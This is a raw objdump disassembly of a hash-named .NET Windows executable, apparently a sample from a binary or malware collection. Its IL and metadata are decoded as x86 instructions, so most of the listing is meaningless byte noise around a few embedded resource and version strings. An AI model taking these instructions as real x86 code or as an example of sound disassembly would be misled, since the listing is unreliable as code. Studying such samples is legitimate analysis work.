
43b1d7cb1a978bd95a2c7e024401e960447883f6033e48bc4c1217dc9ba924cf.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	nop
  402001:	jnp    0x402003
  402003:	add    BYTE PTR [eax],al
  402005:	add    BYTE PTR [eax],al
  402007:	add    BYTE PTR [eax+0x0],cl
  40200a:	add    BYTE PTR [eax],al
  40200c:	add    al,BYTE PTR [eax]
  40200e:	add    eax,0x250400
  402013:	add    BYTE PTR [eax],ah
  402015:	push   ebp
  402016:	add    BYTE PTR [eax],al
  402018:	or     eax,DWORD PTR [eax]
  40201a:	add    BYTE PTR [eax],al
  40201c:	add    DWORD PTR [eax],eax
  40201e:	add    BYTE PTR [esi],al
  402020:	nop
  402021:	and    eax,DWORD PTR [eax]
  402023:	add    BYTE PTR [ecx+0x1],dh
  402026:	add    BYTE PTR [eax],al
  402028:	push   eax
  402029:	and    BYTE PTR [eax],al
  40202b:	add    BYTE PTR [eax+0x0],al
	...
  40204d:	add    BYTE PTR [eax],al
  40204f:	add    BYTE PTR [ebp+0x4bee9fa5],dh
  402055:	mov    edx,0x5bf50eb3
  40205a:	ror    BYTE PTR [ebx-0x6],1
  40205d:	fldl2e 
  40205f:	shr    BYTE PTR [edx+eiz*2+0x6d],0x6e
  402064:	dec    esp
  402065:	outs   dx,BYTE PTR ds:[esi]
  402066:	pop    esp
  402067:	ins    BYTE PTR es:[edi],dx
  402068:	rol    BYTE PTR [ebp+edx*8-0xf278d87],cl
  40206f:	ror    edx,cl
  402071:	and    ecx,DWORD PTR [esi]
  402073:	dec    ebx
  402074:	mov    cl,0xe1
  402076:	inc    eax
  402077:	(bad)  
  402078:	mov    edi,es
  40207a:	cmp    edi,DWORD PTR [esi+0x4f257c29]
  402080:	sub    ch,dl
  402082:	jmp    0x17b736b8
  402087:	scas   eax,DWORD PTR es:[edi]
  402088:	test   al,0xcb
  40208a:	mov    al,0x5b
  40208c:	mov    ebx,0x14bc41da
  402091:	cmp    esp,DWORD PTR [esi]
  402093:	and    DWORD PTR [ebx-0x6],ebp
  402096:	jp     0x402094
  402098:	adc    al,0xcd
  40209a:	fidiv  DWORD PTR [edi-0x360436c8]
  4020a0:	iret   
  4020a1:	mov    dh,0x46
  4020a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020a4:	xor    DWORD PTR [ebx],edx
  4020a6:	jnp    0x402124
  4020a8:	mov    al,0x49
  4020aa:	xor    bl,ah
  4020ac:	rol    BYTE PTR [esi-0x2d830cb0],0x48
  4020b3:	adc    ebx,DWORD PTR [ecx]
  4020b5:	fadd   st,st(6)
  4020b7:	and    DWORD PTR [ebx+0x72],ecx
  4020ba:	mov    al,0x9e
  4020bc:	adc    bh,cl
  4020be:	in     al,dx
  4020bf:	jne    0x4020bc
  4020c1:	inc    edx
  4020c2:	push   ecx
  4020c3:	fistp  DWORD PTR [ebx+0x367d5dce]
  4020c9:	cs pop ss
  4020cb:	fistp  DWORD PTR [eax+0x1e3442b7]
  4020d1:	add    ch,BYTE PTR [eax]
  4020d3:	push   ss
  4020d4:	add    BYTE PTR [eax],al
  4020d6:	or     ch,BYTE PTR [edx]
  4020d8:	push   ds
  4020d9:	add    ch,BYTE PTR [eax]
  4020db:	push   ss
  4020dc:	add    BYTE PTR [eax],al
  4020de:	or     ch,BYTE PTR [edx]
  4020e0:	adc    esi,DWORD PTR [eax]
  4020e2:	add    al,BYTE PTR [eax]
  4020e4:	jno    0x4020e6
  4020e6:	add    BYTE PTR [eax],al
  4020e8:	add    DWORD PTR [eax],eax
  4020ea:	add    BYTE PTR [ecx],dl
  4020ec:	add    bh,BYTE PTR [ebx+0x6]
  4020ef:	add    BYTE PTR [eax],al
  4020f1:	add    al,0x7b
  4020f3:	add    eax,DWORD PTR [eax]
  4020f5:	add    BYTE PTR [ebx+esi*2],al
  4020f8:	pop    ss
  4020f9:	add    BYTE PTR [eax],al
  4020fb:	or     cl,BYTE PTR [edx]
  4020fd:	add    al,0x6f
  4020ff:	sbb    BYTE PTR [eax],al
  402101:	add    BYTE PTR [edx],cl
  402103:	sub    eax,0x77b0234
  402108:	add    BYTE PTR [eax],al
  40210a:	add    al,0x2c
  40210c:	aaa    
  40210d:	add    bh,BYTE PTR [ebx+0x7]
  402110:	add    BYTE PTR [eax],al
  402112:	add    al,0x6f
  402114:	sbb    DWORD PTR [eax],eax
  402116:	add    BYTE PTR [edx],cl
  402118:	sub    al,0x2a
  40211a:	push   es
  40211b:	sub    BYTE PTR [eax],cl
  40211d:	add    BYTE PTR [eax],al
  40211f:	push   es
  402120:	outs   dx,DWORD PTR ds:[esi]
  402121:	sbb    al,BYTE PTR [eax]
  402123:	add    BYTE PTR [edx],cl
  402125:	add    bh,BYTE PTR [ebx+0x7]
  402128:	add    BYTE PTR [eax],al
  40212a:	add    al,0x6f
  40212c:	sbb    DWORD PTR [eax],eax
  40212e:	add    BYTE PTR [edx],cl
  402130:	push   ss
  402131:	outs   dx,DWORD PTR ds:[esi]
  402132:	sbb    eax,DWORD PTR [eax]
  402134:	add    BYTE PTR [edx],cl
  402136:	sub    ecx,DWORD PTR es:[ebx]
  402139:	push   es
  40213a:	sub    BYTE PTR [edi],al
  40213c:	add    BYTE PTR [eax],al
  40213e:	push   es
  40213f:	outs   dx,DWORD PTR ds:[esi]
  402140:	sbb    al,BYTE PTR [eax]
  402142:	add    BYTE PTR [edx],cl
  402144:	add    al,0x17
  402146:	outs   dx,DWORD PTR ds:[esi]
  402147:	sbb    al,0x0
  402149:	add    BYTE PTR [edx],cl
  40214b:	add    bh,BYTE PTR [ebx+0x7]
  40214e:	add    BYTE PTR [eax],al
  402150:	add    al,0x6f
  402152:	sbb    DWORD PTR [eax],eax
  402154:	add    BYTE PTR [edx],cl
  402156:	outs   dx,DWORD PTR ds:[esi]
  402157:	sbb    eax,0x260a0000
  40215c:	sub    al,BYTE PTR [eax]
  40215e:	add    BYTE PTR [eax],al
  402160:	adc    esi,DWORD PTR [eax]
  402162:	add    al,0x0
  402164:	js     0x402166
  402166:	add    BYTE PTR [eax],al
  402168:	add    al,BYTE PTR [eax]
  40216a:	add    BYTE PTR [ecx],dl
  40216c:	jae    0x402179
  40216e:	add    BYTE PTR [eax],al
  402170:	push   es
  402171:	or     al,BYTE PTR [esi]
  402173:	add    bh,BYTE PTR [ebp+0x6]
  402176:	add    BYTE PTR [eax],al
  402178:	add    al,0x6
  40217a:	add    bh,BYTE PTR [ebx+0x3]
  40217d:	add    BYTE PTR [eax],al
  40217f:	add    al,0x73
  402181:	push   ds
  402182:	add    BYTE PTR [eax],al
  402184:	or     ch,BYTE PTR [eax]
  402186:	pop    ds
  402187:	add    BYTE PTR [eax],al
  402189:	or     bh,BYTE PTR [esi+0x20]
  40218c:	add    BYTE PTR [eax],al
  40218e:	or     ch,BYTE PTR [eax]
  402190:	and    DWORD PTR [eax],eax
  402192:	add    BYTE PTR [edx],cl
  402194:	jae    0x4021b8
  402196:	add    BYTE PTR [eax],al
  402198:	or     bh,BYTE PTR [ebp+0x7]
  40219b:	add    BYTE PTR [eax],al
  40219d:	add    al,0x6
  40219f:	inc    BYTE PTR [esi]
  4021a1:	or     al,0x0
  4021a3:	add    BYTE PTR [esi],al
  4021a5:	jae    0x4021ca
  4021a7:	add    BYTE PTR [eax],al
  4021a9:	or     ch,BYTE PTR [eax]
  4021ab:	and    al,0x0
  4021ad:	add    BYTE PTR [edx],cl
  4021af:	push   es
  4021b0:	jnp    0x4021b9
  4021b2:	add    BYTE PTR [eax],al
  4021b4:	add    al,0x2
  4021b6:	jnp    0x4021bd
  4021b8:	add    BYTE PTR [eax],al
  4021ba:	add    al,0x6f
  4021bc:	and    eax,0x2d0a0000
  4021c1:	or     DWORD PTR [edx],eax
  4021c3:	pop    ss
  4021c4:	jge    0x4021ca
  4021c6:	add    BYTE PTR [eax],al
  4021c8:	add    al,0x16
  4021ca:	sub    al,BYTE PTR [edx]
  4021cc:	push   es
  4021cd:	jnp    0x4021d6
  4021cf:	add    BYTE PTR [eax],al
  4021d1:	add    al,0x6f
  4021d3:	add    BYTE PTR es:[eax],al
  4021d6:	or     ch,BYTE PTR ds:0x12b1703
  4021dc:	push   ss
  4021dd:	jge    0x4021e3
  4021df:	add    BYTE PTR [eax],al
  4021e1:	add    al,0x16
  4021e3:	sub    bl,BYTE PTR [ebx]
  4021e5:	xor    BYTE PTR [eax+eax*1],al
  4021e8:	lahf   
  4021e9:	add    BYTE PTR [eax],al
  4021eb:	add    BYTE PTR [ebx],al
  4021ed:	add    BYTE PTR [eax],al
  4021ef:	adc    DWORD PTR [esp+ecx*1],edx
  4021f2:	jae    0x4021fd
  4021f4:	add    BYTE PTR [eax],al
  4021f6:	push   es
  4021f7:	or     eax,0x57d0209
  4021fc:	add    BYTE PTR [eax],al
  4021fe:	add    al,0x72
  402200:	add    DWORD PTR [eax],eax
  402202:	add    BYTE PTR [eax+0x28],dh
  402205:	daa    
  402206:	add    BYTE PTR [eax],al
  402208:	or     cl,BYTE PTR [edx]
  40220a:	push   es
  40220b:	sub    BYTE PTR [eax],ch
  40220d:	add    BYTE PTR [eax],al
  40220f:	or     ch,BYTE PTR ds:0x8d18092a
  402215:	sbb    al,0x0
  402217:	add    BYTE PTR [ecx],al
  402219:	adc    eax,DWORD PTR ds:0x6160511
  40221f:	jae    0x40224a
  402221:	add    BYTE PTR [eax],al
  402223:	or     ah,BYTE PTR [edx+0x73170511]
  402229:	sub    al,BYTE PTR [eax]
  40222b:	add    BYTE PTR [edx],cl
  40222d:	mov    ds:0x2b730511,al
  402232:	add    BYTE PTR [eax],al
  402234:	or     bh,BYTE PTR [ebp+0x3]
  402237:	add    BYTE PTR [eax],al
  402239:	add    al,0x2b
  40223b:	or     ecx,DWORD PTR [ecx]
  40223d:	jae    0x402269
  40223f:	add    BYTE PTR [eax],al
  402241:	or     bh,BYTE PTR [ebp+0x3]
  402244:	add    BYTE PTR [eax],al
  402246:	add    al,0x9
  402248:	push   ss
  402249:	jge    0x40224f
  40224b:	add    BYTE PTR [eax],al
  40224d:	add    al,0x8
  40224f:	sub    eax,0x6fe090d
  402254:	or     al,BYTE PTR [eax]
  402256:	add    BYTE PTR [esi],al
  402258:	jae    0x402286
  40225a:	add    BYTE PTR [eax],al
  40225c:	or     cl,BYTE PTR [eax+ecx*1]
  40225f:	pop    ss
  402260:	sub    BYTE PTR ds:0x260a0000,ch
  402266:	ficomp WORD PTR ds:0x37b0926
  40226c:	add    BYTE PTR [eax],al
  40226e:	add    al,0x73
  402270:	pop    ss
  402271:	add    BYTE PTR [eax],al
  402273:	or     cl,BYTE PTR [ebx]
  402275:	pop    es
  402276:	sub    BYTE PTR [esi],ch
  402278:	add    BYTE PTR [eax],al
  40227a:	or     ch,BYTE PTR [edi+0x2f]
  40227d:	add    BYTE PTR [eax],al
  40227f:	or     bl,BYTE PTR [eax]
  402281:	adc    eax,DWORD PTR [esi+ebx*8]
  402284:	pop    es
  402285:	or     DWORD PTR [ebx+0x4],edi
  402288:	add    BYTE PTR [eax],al
  40228a:	add    al,0x2a
  40228c:	adc    DWORD PTR [edx+ebp*1],eax
  40228f:	add    BYTE PTR [ecx],al
  402291:	adc    BYTE PTR [eax],al
  402293:	add    BYTE PTR [eax],al
  402295:	add    BYTE PTR [esi+0x0],bl
  402298:	sbb    bh,BYTE PTR [eax+0x0]
  40229b:	sbb    eax,0x1000032
  4022a0:	adc    esi,DWORD PTR [eax]
  4022a2:	add    al,0x0
  4022a4:	pop    esp
  4022a5:	add    BYTE PTR [eax],al
  4022a7:	add    BYTE PTR [eax+eax*1],al
  4022aa:	add    BYTE PTR [ecx],dl
  4022ac:	jb     0x4022d1
  4022ae:	add    BYTE PTR [eax],al
  4022b0:	jo     0x4022da
  4022b2:	daa    
  4022b3:	add    BYTE PTR [eax],al
  4022b5:	or     cl,BYTE PTR [edx]
  4022b7:	push   es
  4022b8:	sub    BYTE PTR [eax],ch
  4022ba:	add    BYTE PTR [eax],al
  4022bc:	or     ch,BYTE PTR ds:0x82c0248
  4022c2:	jb     0x402311
  4022c4:	add    BYTE PTR [eax],al
  4022c6:	jo     0x4022d3
  4022c8:	sub    eax,DWORD PTR [esi]
  4022ca:	jb     0x40232d
  4022cc:	add    BYTE PTR [eax],al
  4022ce:	jo     0x4022db
  4022d0:	push   es
  4022d1:	pop    ss
  4022d2:	lea    esi,[eax+eax*1]
  4022d5:	add    BYTE PTR [ecx],al
  4022d7:	or     eax,0x3b1f1609
  4022dc:	popf   
  4022dd:	or     DWORD PTR [edi+0x31],ebp
  4022e0:	add    BYTE PTR [eax],al
  4022e2:	or     dl,BYTE PTR [ebx]
  4022e4:	add    al,0x16
  4022e6:	adc    eax,DWORD PTR ds:0x411152b
  4022ec:	adc    DWORD PTR ds:0x7080c9a,eax
  4022f2:	sbb    ebp,DWORD PTR [eax]
  4022f4:	xor    al,BYTE PTR [eax]
  4022f6:	add    BYTE PTR [edx],cl
  4022f8:	adc    DWORD PTR es:0x5135817,eax
  4022ff:	adc    DWORD PTR ds:0x698e0411,eax
  402305:	xor    ah,bl
  402307:	sub    bl,BYTE PTR [esi]
  402309:	add    ch,BYTE PTR [eax]
  40230b:	push   ss
  40230c:	add    BYTE PTR [eax],al
  40230e:	or     ch,BYTE PTR [edx]
  402310:	adc    esi,DWORD PTR [eax]
  402312:	add    al,BYTE PTR [eax]
  402314:	xor    eax,DWORD PTR [eax]
  402316:	add    BYTE PTR [eax],al
  402318:	add    eax,0x7e110000
  40231d:	add    DWORD PTR [eax],eax
  40231f:	add    BYTE PTR [esp+edx*1],al
  402322:	sub    BYTE PTR [esi],dh
  402324:	add    BYTE PTR [eax],al
  402326:	or     ch,BYTE PTR [eax+eiz*1]
  402329:	jb     0x40239e
  40232b:	add    BYTE PTR [eax],al
  40232d:	jo     0x4022ff
  40232f:	add    eax,DWORD PTR [eax]
  402331:	add    BYTE PTR [edx],al
  402333:	sub    BYTE PTR [edi],dh
  402335:	add    BYTE PTR [eax],al
  402337:	or     ch,BYTE PTR [edi+0x38]
  40233a:	add    BYTE PTR [eax],al
  40233c:	or     dh,BYTE PTR [ebx+0x39]
  40233f:	add    BYTE PTR [eax],al
  402341:	or     cl,BYTE PTR [edx]
  402343:	push   es
  402344:	add    BYTE PTR [ecx],0x0
  402347:	add    BYTE PTR [esi+edi*2],al
  40234a:	add    DWORD PTR [eax],eax
  40234c:	add    BYTE PTR [edx+ebp*1],al
  40234f:	sbb    bh,BYTE PTR [esi+0x2]
  402352:	add    BYTE PTR [eax],al
  402354:	add    al,0x2a
  402356:	push   ds
  402357:	add    al,BYTE PTR [eax+0x4000002]
  40235d:	sub    dl,BYTE PTR [esi+0x28]
  402360:	add    al,0x0
  402362:	add    BYTE PTR [esi],al
  402364:	jb     0x40234d
  402366:	add    BYTE PTR [eax],al
  402368:	jo     0x4023e8
  40236a:	add    al,BYTE PTR [eax]
  40236c:	add    BYTE PTR [edi+ebp*2],al
  40236f:	cmp    al,BYTE PTR [eax]
  402371:	add    BYTE PTR [edx],cl
  402373:	sub    dl,BYTE PTR [esi+0x28]
  402376:	add    al,0x0
  402378:	add    BYTE PTR [esi],al
  40237a:	jb     0x402385
  40237c:	add    DWORD PTR [eax],eax
  40237e:	jo     0x4023fe
  402380:	add    al,BYTE PTR [eax]
  402382:	add    BYTE PTR [edi+ebp*2],al
  402385:	cmp    al,BYTE PTR [eax]
  402387:	add    BYTE PTR [edx],cl
  402389:	sub    al,BYTE PTR [eax]
  40238b:	add    BYTE PTR [eax],al
  40238d:	add    BYTE PTR [eax],al
  40238f:	add    BYTE PTR [ebp+0x1],ch
  402392:	add    BYTE PTR [eax],al
  402394:	into   
  402395:	retf   0xbeef
  402398:	add    DWORD PTR [eax],eax
  40239a:	add    BYTE PTR [eax],al
  40239c:	xchg   ecx,eax
  40239d:	add    BYTE PTR [eax],al
  40239f:	add    BYTE PTR [ebx+edx*2+0x79],ch
  4023a3:	jae    0x402419
  4023a5:	gs ins DWORD PTR es:[edi],dx
  4023a7:	cs push edx
  4023a9:	gs jae 0x40241b
  4023ac:	jne    0x402420
  4023ae:	arpl   WORD PTR [ebp+0x73],sp
  4023b1:	cs push edx
  4023b3:	gs jae 0x402425
  4023b6:	jne    0x40242a
  4023b8:	arpl   WORD PTR [ebp+0x52],sp
  4023bb:	gs popa 
  4023bd:	fs gs jb 0x4023ed
  4023c1:	and    BYTE PTR [ebp+0x73],ch
  4023c4:	arpl   WORD PTR [edi+0x72],bp
  4023c7:	ins    BYTE PTR es:[edi],dx
  4023c8:	imul   esp,DWORD PTR [edx+0x2c],0x72655620
  4023cf:	jae    0x40243a
  4023d1:	outs   dx,DWORD PTR ds:[esi]
  4023d2:	outs   dx,BYTE PTR ds:[esi]
  4023d3:	cmp    eax,0x2e302e32
  4023d8:	xor    BYTE PTR [esi],ch
  4023da:	xor    BYTE PTR [eax+eiz*1],ch
  4023dd:	inc    ebx
  4023de:	jne    0x40244c
  4023e0:	je     0x402457
  4023e2:	jb     0x402449
  4023e4:	cmp    eax,0x7475656e
  4023e9:	jb     0x40244c
  4023eb:	ins    BYTE PTR es:[edi],dx
  4023ec:	sub    al,0x20
  4023ee:	push   eax
  4023ef:	jne    0x402453
  4023f1:	ins    BYTE PTR es:[edi],dx
  4023f2:	imul   esp,DWORD PTR [ebx+0x4b],0x6f547965
  4023f9:	imul   esp,DWORD PTR [ebp+0x6e],0x3d
  4023fd:	bound  esi,QWORD PTR [edi]
  4023ff:	aaa    
  402400:	popa   
  402401:	xor    eax,0x31363563
  402406:	cmp    DWORD PTR [ebx],esi
  402408:	xor    al,0x65
  40240a:	xor    BYTE PTR [eax],bh
  40240c:	cmp    DWORD PTR [ebx],esp
  40240e:	push   ebx
  40240f:	jns    0x402484
  402411:	je     0x402478
  402413:	ins    DWORD PTR es:[edi],dx
  402414:	cs push edx
  402416:	gs jae 0x402488
  402419:	jne    0x40248d
  40241b:	arpl   WORD PTR [ebp+0x73],sp
  40241e:	cs push edx
  402420:	jne    0x402490
  402422:	je     0x40248d
  402424:	ins    DWORD PTR es:[edi],dx
  402425:	gs push edx
  402427:	gs jae 0x402499
  40242a:	jne    0x40249e
  40242c:	arpl   WORD PTR [ebp+0x53],sp
  40242f:	gs je  0x402434
  402432:	add    BYTE PTR [eax],al
  402434:	add    BYTE PTR [edx],al
  402436:	add    BYTE PTR [eax],al
  402438:	add    BYTE PTR [eax],al
  40243a:	add    BYTE PTR [eax],al
  40243c:	add    BYTE PTR [eax+0x41],dl
  40243f:	inc    esp
  402440:	push   eax
  402441:	inc    ecx
  402442:	inc    esp
  402443:	push   eax
  402444:	adc    eax,0x290fd22b
  402449:	sub    DWORD PTR [edx],ecx
  40244b:	and    DWORD PTR [eax],eax
  40244d:	add    BYTE PTR [eax],al
  40244f:	add    BYTE PTR ds:0x6000000,ah
  402455:	add    DWORD PTR [eax],eax
  402457:	add    BYTE PTR [eax],ah
  402459:	inc    ebx
  40245a:	add    BYTE PTR [eax+eax*1+0x72],dh
  40245e:	add    BYTE PTR [eax+eax*1+0x42],ch
  402462:	add    BYTE PTR [edx+0x0],dh
  402465:	add    BYTE PTR gs:[ecx+0x0],ah
  402469:	imul   eax,DWORD PTR [eax],0x50
  40246c:	add    BYTE PTR [edx+0x0],dh
  40246f:	add    BYTE PTR gs:[ebx+0x0],dh
  402473:	jae    0x402475
  402475:	add    BYTE PTR gs:[eax+eax*1+0x0],ah
  40247a:	add    BYTE PTR [eax],al
  40247c:	add    BYTE PTR [eax],bl
  40247e:	inc    ebx
  40247f:	add    BYTE PTR [eax+eax*1+0x72],dh
  402483:	add    BYTE PTR [eax+eax*1+0x43],ch
  402487:	add    BYTE PTR [eax+0x0],dl
  40248a:	jb     0x40248c
  40248c:	add    BYTE PTR gs:[ebx+0x0],dh
  402490:	jae    0x402492
  402492:	add    BYTE PTR gs:[eax+eax*1+0x44],ah
  402497:	add    BYTE PTR [eax],al
  402499:	add    BYTE PTR [ecx],al
  40249b:	inc    edx
  40249c:	inc    ebx
  40249d:	outs   dx,DWORD PTR ds:[esi]
  40249e:	outs   dx,BYTE PTR ds:[esi]
  40249f:	je     0x402513
  4024a1:	outs   dx,DWORD PTR ds:[esi]
  4024a2:	ins    BYTE PTR es:[edi],dx
  4024a3:	sub    eax,0x61657242
  4024a8:	imul   esp,DWORD PTR [eax],0x70
  4024ab:	jb     0x402512
  4024ad:	jae    0x402522
  4024af:	gs cmp ah,BYTE PTR fs:[eax]
  4024b3:	popa   
  4024b4:	bound  ebp,QWORD PTR [edi+0x72]
  4024b7:	je     0x402522
  4024b9:	outs   dx,BYTE PTR ds:[esi]
  4024ba:	and    BYTE PTR [di+0x78],ah
  4024be:	arpl   WORD PTR gs:[ebp+0x74],si
  4024c2:	imul   ebp,DWORD PTR [edi+0x6e],0x4420202e
  4024c9:	popa   
  4024ca:	je     0x40252d
  4024cc:	and    BYTE PTR [ebp+0x61],ch
  4024cf:	jns    0x4024f1
  4024d1:	bound  esp,QWORD PTR [ebp+0x20]
  4024d4:	arpl   WORD PTR [edi+0x72],bp
  4024d7:	jb     0x40254e
  4024d9:	jo     0x40254f
  4024db:	gs fs add DWORD PTR cs:[ecx],esp
  4024e0:	inc    ebx
  4024e1:	outs   dx,DWORD PTR ds:[esi]
  4024e2:	outs   dx,BYTE PTR ds:[esi]
  4024e3:	je     0x402557
  4024e5:	outs   dx,DWORD PTR ds:[esi]
  4024e6:	ins    BYTE PTR es:[edi],dx
  4024e7:	sub    eax,0x72702043
  4024ec:	gs jae 0x402562
  4024ef:	gs cmp ah,BYTE PTR fs:[eax]
  4024f3:	jae    0x40255d
  4024f5:	jne    0x40256b
  4024f7:	je     0x402562
  4024f9:	outs   dx,BYTE PTR ds:[esi]
  4024fa:	and    BYTE PTR [si+0x6f],ah
  4024fe:	ja     0x40256e
  402500:	add    BYTE PTR cs:[eax],al
  402503:	add    BYTE PTR [edx+0x53],al
  402506:	dec    edx
  402507:	inc    edx
  402508:	add    DWORD PTR [eax],eax
  40250a:	add    DWORD PTR [eax],eax
  40250c:	add    BYTE PTR [eax],al
  40250e:	add    BYTE PTR [eax],al
  402510:	or     al,0x0
  402512:	add    BYTE PTR [eax],al
  402514:	jbe    0x402548
  402516:	xor    BYTE PTR cs:[esi],ch
  402519:	xor    eax,0x37323730
  40251e:	add    BYTE PTR [eax],al
  402520:	add    BYTE PTR [eax],al
  402522:	add    eax,0x6c00
  402527:	add    al,dl
  402529:	push   es
  40252a:	add    BYTE PTR [eax],al
  40252c:	and    edi,DWORD PTR [esi+0x0]
  40252f:	add    BYTE PTR [edi+eax*1],bh
  402532:	add    BYTE PTR [eax],al
  402534:	or     BYTE PTR [ecx],0x0
  402537:	add    BYTE PTR [ebx],ah
  402539:	push   ebx
  40253a:	je     0x4025ae
  40253c:	imul   ebp,DWORD PTR [esi+0x67],0x73
  402543:	add    BYTE PTR [eax+edx*1+0x1240000],bh
  40254a:	add    BYTE PTR [eax],al
  40254c:	and    edx,DWORD PTR [ebp+0x53]
  40254f:	add    al,ah
  402551:	adc    DWORD PTR [eax],eax
  402553:	add    BYTE PTR [eax],dl
  402555:	add    BYTE PTR [eax],al
  402557:	add    BYTE PTR [ebx],ah
  402559:	inc    edi
  40255a:	push   ebp
  40255b:	dec    ecx
  40255c:	inc    esp
  40255d:	add    BYTE PTR [eax],al
  40255f:	add    al,dh
  402561:	adc    DWORD PTR [eax],eax
  402563:	add    BYTE PTR [eax],dh
  402565:	inc    ebx
  402566:	add    BYTE PTR [eax],al
  402568:	and    eax,DWORD PTR [edx+0x6c]
  40256b:	outs   dx,DWORD PTR ds:[esi]
  40256c:	bound  eax,QWORD PTR [eax]
  40256e:	add    BYTE PTR [eax],al
  402570:	add    BYTE PTR [eax],al
  402572:	add    BYTE PTR [eax],al
  402574:	add    al,BYTE PTR [eax]
  402576:	add    BYTE PTR [ecx],al
  402578:	push   edi
  402579:	push   ebp
  40257a:	mov    ds:0x30901,al
  40257f:	add    BYTE PTR [eax],al
  402581:	cli    
  402582:	and    eax,0x160033
  402587:	add    BYTE PTR [ecx],al
  402589:	add    BYTE PTR [eax],al
  40258b:	add    BYTE PTR [esi],bh
  40258d:	add    BYTE PTR [eax],al
  40258f:	add    BYTE PTR ds:0x7000000,al
  402595:	add    BYTE PTR [eax],al
  402597:	add    BYTE PTR [eax+eax*1],cl
  40259a:	add    BYTE PTR [eax],al
  40259c:	add    eax,0x3c000000
  4025a1:	add    BYTE PTR [eax],al
  4025a3:	add    BYTE PTR [esi+0x0],al
  4025a6:	add    BYTE PTR [eax],al
  4025a8:	add    DWORD PTR [eax],eax
  4025aa:	add    BYTE PTR [eax],al
  4025ac:	add    eax,0x1000000
  4025b1:	add    BYTE PTR [eax],al
  4025b3:	add    BYTE PTR [eax+eax*1],al
  4025b6:	add    BYTE PTR [eax],al
  4025b8:	add    eax,0x1000000
  4025bd:	add    BYTE PTR [eax],al
  4025bf:	add    BYTE PTR [ebx],al
  4025c1:	add    BYTE PTR [eax],al
  4025c3:	add    BYTE PTR [ecx],al
  4025c5:	add    BYTE PTR [eax],al
  4025c7:	add    BYTE PTR [edx],al
  4025c9:	add    BYTE PTR [eax],al
  4025cb:	add    BYTE PTR [eax],al
  4025cd:	add    BYTE PTR [edx],cl
  4025cf:	add    BYTE PTR [ecx],al
  4025d1:	add    BYTE PTR [eax],al
  4025d3:	add    BYTE PTR [eax],al
  4025d5:	add    BYTE PTR [esi],al
  4025d7:	add    BYTE PTR [ebp+0x0],ch
  4025da:	data16 add BYTE PTR [esi],al
  4025dd:	add    BYTE PTR [ebp+0x6008c00],bl
  4025e3:	add    dh,cl
  4025e5:	add    BYTE PTR [ecx-0x5efffa00],bh
  4025eb:	add    DWORD PTR [edx-0x4afff9ff],eax
  4025f1:	add    DWORD PTR [esi+0x0],esp
  4025f4:	push   es
  4025f5:	add    ch,bl
  4025f7:	add    ebx,ecx
  4025f9:	add    DWORD PTR [esi],eax
  4025fb:	add    ah,dh
  4025fd:	add    ebx,ecx
  4025ff:	add    DWORD PTR [esi],eax
  402601:	add    BYTE PTR [ecx],dl
  402603:	add    cl,bl
  402605:	add    DWORD PTR [esi],eax
  402607:	add    BYTE PTR [edi],ch
  402609:	add    cl,bl
  40260b:	add    DWORD PTR [esi],eax
  40260d:	add    BYTE PTR [eax+0x2],cl
  402610:	retf   
  402611:	add    DWORD PTR [esi],eax
  402613:	add    BYTE PTR [ecx+0x2],ah
  402616:	retf   
  402617:	add    DWORD PTR [esi],eax
  402619:	add    BYTE PTR [edx+eax*1-0x74],bh
  40261d:	add    BYTE PTR [esi],al
  40261f:	add    BYTE PTR [esi+0x601cb02],bl
  402625:	add    BYTE PTR [ecx+0x601cb02],bh
  40262b:	add    dl,dh
  40262d:	add    dl,dl
  40262f:	add    al,BYTE PTR [esi]
  402631:	add    BYTE PTR [eax],dl
  402633:	add    ecx,ebx
  402635:	add    DWORD PTR [esi],eax
  402637:	add    BYTE PTR [ecx],ch
  402639:	add    ecx,ebx
  40263b:	add    DWORD PTR [esi],eax
  40263d:	add    BYTE PTR [esi+0x3],al
  402640:	retf   
  402641:	add    DWORD PTR [esi],eax
  402643:	add    BYTE PTR [ebx+eax*1-0x74],ch
  402647:	add    BYTE PTR [esi],al
  402649:	add    BYTE PTR [esi+0x602d203],cl
  40264f:	add    dh,al
  402651:	add    ebp,DWORD PTR [edx-0x1dfff9fd]
  402657:	add    ebp,DWORD PTR [edx+0x4000603]
  40265d:	add    al,0xf1
  40265f:	add    ebx,DWORD PTR [edi+0x0]
  402662:	sbb    BYTE PTR [eax+eax*1],al
  402665:	add    BYTE PTR [esi],al
  402667:	add    BYTE PTR [edi],ah
  402669:	add    al,0xd2
  40266b:	add    al,BYTE PTR [esi]
  40266d:	add    BYTE PTR [esp+eax*1+0x66],dl
  402671:	add    BYTE PTR [esi],al
  402673:	add    BYTE PTR [eax+0x4],dh
  402676:	data16 add BYTE PTR [edx],cl
  402679:	add    dl,dh
  40267b:	add    al,0xc7
  40267d:	add    al,0xa
  40267f:	add    BYTE PTR [edx+0x5],dl
  402682:	cs add eax,0x5680006
  402688:	data16 add BYTE PTR [edx],cl
  40268b:	add    BYTE PTR [ebx+0x604c705],dl
  402691:	add    BYTE PTR [eax+0xa006605],ah
  402697:	add    cl,al
  402699:	add    eax,0xa052e
  40269e:	loopne 0x4026a5
  4026a0:	mov    DWORD PTR [edx+ecx*1],0xc7061a00
  4026a7:	add    al,0x6
  4026a9:	add    BYTE PTR [esi],dh
  4026ab:	push   es
  4026ac:	sub    al,0x6
  4026ae:	push   es
  4026af:	add    BYTE PTR [ebx+0x6],al
  4026b2:	data16 add BYTE PTR [esi],al
  4026b5:	add    BYTE PTR [ebp+0x6],bl
  4026b8:	data16 add BYTE PTR [edx],cl
  4026bb:	add    BYTE PTR [eax+0x6],bh
  4026be:	cs add eax,0x6a70006
  4026c4:	data16 add BYTE PTR [esi],al
  4026c7:	add    dl,cl
  4026c9:	push   es
  4026ca:	data16 add BYTE PTR [edx],cl
  4026cd:	add    bh,bl
  4026cf:	push   es
  4026d0:	mov    DWORD PTR [edx+ecx*1],0xc706ef00
  4026d7:	add    al,0xa
  4026d9:	add    BYTE PTR [eax],al
  4026db:	pop    es
  4026dc:	mov    DWORD PTR [esi+eax*1],0x11072c00
  4026e3:	pop    es
  4026e4:	or     al,BYTE PTR [eax]
  4026e6:	pop    esi
  4026e7:	pop    es
  4026e8:	xor    al,0x7
  4026ea:	mov    ebx,0x77000
  4026ef:	add    BYTE PTR [edx],cl
  4026f1:	add    BYTE PTR [ecx+0xa073407],al
  4026f7:	add    BYTE PTR [eax+0x604c707],bl
  4026fd:	add    al,cl
